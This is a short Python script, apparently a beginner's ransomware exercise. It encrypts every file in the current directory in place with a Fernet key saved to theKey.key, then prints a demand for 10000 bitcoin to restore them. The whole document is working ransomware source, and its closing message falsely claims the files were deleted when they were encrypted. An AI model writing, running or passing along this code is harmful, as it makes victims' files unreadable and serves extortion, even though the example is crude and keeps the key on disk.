#!/usr/bin/env python3 

#THIS CODE IMPORTS THE NECESARY LIBRARIES FOR OUR RANSOMWARE
import os
from cryptography.fernet import Fernet


#THIS CODE SCANS THE DIRECTORY FOR FILES
files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "theKey.key" or file == "deCrypt.py":
        continue #This means ignore the voldemort and key file 
    if os.path.isfile(file): # This ignore the Directories, and just uses the files (.txt)
        files.append(file)
print(files)


#THIS GENERATES A KEY FOR ENCRYPTION
key = Fernet.generate_key()
with open("theKey.key", "wb") as theKey: #wb means Write Binary && Open function creates a new file and writes unto it
    theKey.write(key)


#THIS CODE ENCRYPTS THE FILES WITH OUR GENERATED KEY
for file in files:
    with open(file, "rb") as theFile: #rb means Read Binary 
        contents = theFile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as theFile:
        theFile.write(contents_encrypted)

print("All of the files in your computer has been deleted. If you send me 10000 bitcoin, I will give you the key")